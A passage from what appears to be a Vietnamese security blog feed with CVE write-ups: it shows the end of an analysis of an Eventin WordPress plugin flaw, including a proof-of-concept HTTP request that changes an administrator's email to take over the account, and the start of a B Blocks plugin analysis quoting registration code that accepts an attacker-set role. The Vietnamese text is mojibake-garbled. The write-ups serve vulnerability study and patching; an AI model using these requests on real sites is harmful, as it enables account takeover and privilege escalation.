UI&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;UI sends request to /wp-json/eventin/v2/speakers/{id}&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Attacker intercepts request using BurpSuite&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Modify {id} to target arbitrary user (e.g., Administrator)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Change email field to attacker-controlled email&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Send forged request to API endpoint&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;update_item_permissions_check() passes (Contributor has etn_manage_* capability)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;prepare_item_for_database() accepts and maps user-controlled id and email&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;User_Model instantiated with attacker-supplied id&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;update() overwrites user_email and calls wp_update_user()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user&amp;#39;s email is changed to attacker-controlled email&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker triggers WordPress password reset for the victim account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Reset link is delivered to attacker email&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attacker sets new password&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Attacker logs in as victim (e.g., Administrator)&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Privilege Escalation / Account Takeover achieved&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ƒêƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n &lt;strong&gt;Contributor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán c·∫≠p nh·∫≠t speaker t·∫°i:&#xA;&lt;code&gt;http://localhost/wp-admin/admin.php?page=eventin#/speakers/edit/{id}&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/ui.png&#34; title=&#34;Edit speaker&#34; data-thumbnail=&#34;/posts/2026-01-12-cve-2025-4796/ui.png&#34; data-sub-html=&#34;&lt;h2&gt;UI&lt;/h2&gt;&lt;p&gt;Edit speaker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-12-cve-2025-4796/ui.png&#39; alt=&#34;UI&#34; height=&#34;1123&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit speaker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;B·∫Øt request b·∫±ng &lt;strong&gt;BurpSuite&lt;/strong&gt; v√† g·ª≠i l·∫°i v·ªõi &lt;strong&gt;ID c·ªßa user b·∫•t k·ª≥&lt;/strong&gt; c√πng &lt;strong&gt;email do attacker ki·ªÉm so√°t&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/eventin/v2/speakers/44 HTTP/1.1&#xA;Host: localhost&#xA;X-WP-Nonce: valid_nonce&#xA;Cookie: contributor_cookie&#xA;&#xA;{&#xA;  &amp;#34;summary&amp;#34;: &amp;#34;&amp;lt;p&amp;gt;asfsfas&amp;lt;/p&amp;gt;&amp;#34;,&#xA;  &amp;#34;social&amp;#34;: [&#xA;    {}&#xA;  ],&#xA;  &amp;#34;name&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;  &amp;#34;email&amp;#34;: &amp;#34;hacker1@gmail.com&amp;#34;,&#xA;  &amp;#34;category&amp;#34;: [&#xA;    &amp;#34;speaker&amp;#34;&#xA;  ],&#xA;  &amp;#34;speaker_group&amp;#34;: [&#xA;    33&#xA;  ],&#xA;  &amp;#34;designation&amp;#34;: &amp;#34;rewrew&amp;#34;,&#xA;  &amp;#34;company_name&amp;#34;: &amp;#34;rewrew&amp;#34;,&#xA;  &amp;#34;date&amp;#34;: null&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-12-cve-2025-4796/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-12-cve-2025-4796/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-12-cve-2025-4796/result.png&#39; alt=&#34;Result&#34; height=&#34;916&#34; width=&#34;1498&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;reset password&lt;/strong&gt; v·ªõi email ƒë√£ b·ªã thay ƒë·ªïi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ƒêƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n v·ª´a chi·∫øm quy·ªÅn ki·ªÉm so√°t.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-4796 trong plugin &lt;strong&gt;Eventin ‚â§ 4.0.34&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;kh√¥ng ki·ªÉm so√°t ƒë·∫ßy ƒë·ªß quy·ªÅn ch·ªânh s·ª≠a user&lt;/strong&gt; trong API &lt;code&gt;update_item&lt;/code&gt;. Endpoint n√†y cho ph√©p ng∆∞·ªùi d√πng c√≥ role &lt;strong&gt;Contributor&lt;/strong&gt; thao t√°c v·ªõi &lt;strong&gt;ID user t√πy √Ω&lt;/strong&gt; v√† c·∫≠p nh·∫≠t tr·ª±c ti·∫øp tr∆∞·ªùng &lt;strong&gt;email&lt;/strong&gt;, d·∫´n ƒë·∫øn kh·∫£ nƒÉng &lt;strong&gt;chi·∫øm quy·ªÅn t√†i kho·∫£n th√¥ng qua ch·ª©c nƒÉng reset m·∫≠t kh·∫©u&lt;/strong&gt;. Vi·ªác thi·∫øu r√†ng bu·ªôc gi·ªØa ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c ch·ªânh s·ª≠a v√† quy·ªÅn th·ª±c t·∫ø c·ªßa ng∆∞·ªùi g·ªçi API ƒë√£ t·∫°o ƒëi·ªÅu ki·ªán cho &lt;strong&gt;Privilege Escalation&lt;/strong&gt; v√† &lt;strong&gt;Account Takeover&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;4.0.35&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·ªï sung ki·ªÉm tra t·ªìn t·∫°i user, ki·ªÉm so√°t quy·ªÅn &lt;code&gt;edit_user&lt;/code&gt;, gi·ªõi h·∫°n role h·ª£p l·ªá v√† ch·∫∑n c·∫≠p nh·∫≠t c√°c role nh·∫°y c·∫£m, qua ƒë√≥ lo·∫°i b·ªè kh·∫£ nƒÉng s·ª≠a email tr√°i ph√©p.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n ch·ªâ d·ª±a v√†o &lt;strong&gt;capability t·ªïng qu√°t&lt;/strong&gt; cho c√°c endpoint nh·∫°y c·∫£m; c·∫ßn ki·ªÉm tra &lt;strong&gt;quy·ªÅn tr√™n t·ª´ng ƒë·ªëi t∆∞·ª£ng (object-level authorization)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;M·ªçi tham s·ªë nh·∫°y c·∫£m t·ª´ request nh∆∞ &lt;strong&gt;user ID, email, role&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c &lt;strong&gt;x√°c th·ª±c v√† r√†ng bu·ªôc ch·∫∑t ch·∫Ω&lt;/strong&gt; tr∆∞·ªõc khi ghi v√†o database.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác cho ph√©p c·∫≠p nh·∫≠t &lt;strong&gt;email ng∆∞·ªùi d√πng&lt;/strong&gt; c√≥ th·ªÉ gi√°n ti·∫øp d·∫´n ƒë·∫øn &lt;strong&gt;Account Takeover&lt;/strong&gt; th√¥ng qua c∆° ch·∫ø reset m·∫≠t kh·∫©u.&lt;/li&gt;&#xA;&lt;li&gt;REST API trong WordPress c·∫ßn k·∫øt h·ª£p &lt;strong&gt;permission_callback&lt;/strong&gt;, &lt;strong&gt;current_user_can(&amp;rsquo;edit_user&amp;rsquo;, $target_id)&lt;/strong&gt; v√† &lt;strong&gt;role validation&lt;/strong&gt; ƒë·ªÉ tr√°nh leo thang ƒë·∫∑c quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n so s√°nh &lt;strong&gt;diff gi·ªØa phi√™n b·∫£n v√° v√† phi√™n b·∫£n l·ªói&lt;/strong&gt; ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c nguy√™n nh√¢n v√† ph·∫°m vi ·∫£nh h∆∞·ªüng c·ªßa l·ªó h·ªïng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-event-solution/vulnerability/wordpress-eventin-plugin-4-0-34-authenticated-contributor-privilege-escalation-via-user-email-change-account-takeover-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Eventin Plugin &amp;lt;= 4.0.34 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-8059 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-11-cve-2025-8059/</link>
      <pubDate>Sun, 11 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-11-cve-2025-8059/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;B Blocks&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;N√¢ng cao ƒë·∫∑c quy·ªÅn (Privilege Escalation)&lt;/strong&gt; do &lt;strong&gt;thi·∫øu ki·ªÉm tra ph√¢n quy·ªÅn (missing authorization)&lt;/strong&gt; v√† &lt;strong&gt;x√°c th·ª±c d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë√∫ng c√°ch (improper input validation)&lt;/strong&gt; trong h√†m &lt;strong&gt;rgfr_registration()&lt;/strong&gt; ·ªü &lt;strong&gt;t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn v√† bao g·ªìm 2.0.6&lt;/strong&gt;. L·ªó h·ªïng n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c (unauthenticated attackers)&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;t·∫°o t√†i kho·∫£n m·ªõi&lt;/strong&gt; v√† &lt;strong&gt;g√°n quy·ªÅn qu·∫£n tr·ªã vi√™n (administrator role)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-8059&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-8059&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 2.0.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.0.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/b-blocks/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress B Blocks Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;B Blocks&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.0.6&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.0.7&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_rgfr_registration&amp;#39;, [$this, &amp;#39;rgfr_registration&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; l√† hook d√†nh cho t·∫•t c·∫£ ng∆∞·ªùi d√πng (k·ªÉ c·∫£ ch∆∞a ƒëƒÉng nh·∫≠p).&#xA;Khi c√≥ request ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=rgfr_registration&lt;/code&gt; th√¨ callback &lt;code&gt;rgfr_registration&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω vi·ªác ƒëƒÉng k√Ω user.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function rgfr_registration(){&#xA;    $userEmailSent = false;&#xA;    $adminEmailSent = false;&#xA;    $errors = [];&#xA;&#xA;    $nonce = sanitize_text_field($_POST[&amp;#39;nonce&amp;#39;]);&#xA;&#xA;    if(!wp_verify_nonce($nonce, &amp;#39;wp_ajax&amp;#39;)){&#xA;        wp_send_json_error(&amp;#39;invalid request&amp;#39;);&#xA;    }&#xA;&#xA;    $data = [&#xA;        &amp;#39;username&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;username&amp;#39;] ?? null),&#xA;        &amp;#39;email&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;email&amp;#39;] ?? null),&#xA;        &amp;#39;password&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;password&amp;#39;] ?? null),&#xA;        &amp;#39;confirmpassword&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;confirmpassword&amp;#39;] ?? null),&#xA;        &amp;#39;firstname&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;firstName&amp;#39;] ?? null),&#xA;        &amp;#39;lastname&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;lastName&amp;#39;] ?? null),&#xA;        &amp;#39;website&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;website&amp;#39;] ?? null),&#xA;        &amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field($_POST[&amp;#39;role&amp;#39;] ?? null),&#xA;    ];&#xA;&#xA;    $fields = $this-&amp;gt;sanitize_array($_POST[&amp;#39;fields&amp;#39;]);&#xA;    $userEmail = $this-&amp;gt;sanitize_array($_POST[&amp;#39;userEmail&amp;#39;]) ?? null;&#xA;    $adminEmail = $this-&amp;gt;sanitize_array($_POST[&amp;#39;adminEmail&amp;#39;]) ?? null;&#xA;&#xA;    ...&#xA;&#xA;    $user_id = wp_create_user( $data[&amp;#39;username&amp;#39;], $data[&amp;#39;password&amp;#39;], $data[&amp;#39;email&amp;#39;] );&#xA;&#xA;    if(isset($user_id-&amp;gt;errors)){&#xA;        wp_send_json_error($user_id-&amp;gt;errors);&#xA;    }&#xA;    &#xA;    // now we create an account&#xA;    if( $user_id ){ // sent mail after create account&#xA;        wp_update_user([&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $user_id,&#xA;            &amp;#39;first_name&amp;#39; =&amp;gt; $data[&amp;#39;firstName&amp;#39;],&#xA;            &amp;#39;last_name&amp;#39; =&amp;gt; $data[&amp;#39;lastName&amp;#39;],&#xA;            &amp;#39;user_url&amp;#39; =&amp;gt; $data[&amp;#39;website&amp;#39;],&#xA;            &amp;#39;role&amp;#39; =&amp;gt; $data[&amp;#39;role&amp;#39;],&#xA;        ]);&#xA;        ...&#xA;    }else {&#xA;        wp_send_json_error(&amp;#39;something went wrong during registration&amp;#39;);&#xA;    }&#xA;&#xA;    $user = get_user_by(&amp;#39;id&amp;#39;, $user_id);&#xA;&#xA;    wp_send_json_success([&#xA;        &amp;#39;user&amp;#39; =&amp;gt; $user-&amp;gt;data,&#xA;        &amp;#39;user_id&amp;#39; =&amp;gt; $user_id,&#xA;        &amp;#39;adminEmailSent&amp;#39; =&amp;gt; $adminEmailSent,&#xA;        &amp;#39;userEmailSent&amp;#39; =&amp;gt; $userEmailSent,&#xA;        &amp;#39;roles&amp;#39; =&amp;gt; $user-&amp;gt;roles&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán nh·∫≠n 